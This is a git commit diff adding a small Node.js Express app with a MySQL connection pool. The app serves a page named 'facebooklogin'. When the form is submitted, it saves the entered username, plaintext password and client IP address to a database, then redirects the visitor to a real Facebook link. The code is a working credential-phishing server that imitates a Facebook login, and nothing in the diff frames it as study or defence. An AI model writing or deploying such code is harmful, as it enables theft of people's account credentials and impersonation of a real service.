bca10e517a7da8fe157d64ad6b41d92abd34e404
yhubhee <emenyiubongabasi415@gmail.com>
2025-07-23 14:57:38 +0100

    Initial commit

---
+++ database.js
@@ -0,0 +1,24 @@
+require('dotenv').config();
+const mysql2 = require('mysql2');
+
+const pool = mysql2.createPool({
+    host: process.env.DB_HOST,
+    user: process.env.DB_USER,
+    password: process.env.DB_PASS,
+    database: process.env.DB_NAME,
+    port: process.env.DB_PORT,
+    waitForConnections: true,
+    connectionLimit: 10,
+    queueLimit: 0
+});
+
+pool.getConnection((err, connection) => {
+    if (err) {
+        console.error('Error connecting to MySQL:', err);
+    } else {
+        console.log('Connected to MySQL database');
+        connection.release();
+    }
+});
+
+module.exports = pool;
---
+++ server.js
@@ -0,0 +1,33 @@
+const express = require('express');
+const app = express();
+const db = require('./database');
+
+// Set EJS as the view engine
+app.set('view engine', 'ejs');
+
+app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
+
+app.get('/', (req, res)=>{
+    res.render("facebooklogin")
+})
+
+app.post('/login', (req, res) => {
+    const { user, password } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const sql = 'INSERT INTO users (userdetail, password, ip) VALUES (?, ?, ?)';
+    db.query(sql, [user, password, ip], (err, result) => {
+        if (err) {
+            console.error('Database error:', err);
+            return res.render('facebooklogin');
+        }
+        res.redirect('https://web.facebook.com/share/v/1YpkFzDf2z/')
+    });
+});
+
+module.exports = app; 
+
+const port = 1000;
+app.listen(port, () =>{
+    console.log(`server started on port ${port}`)
+})
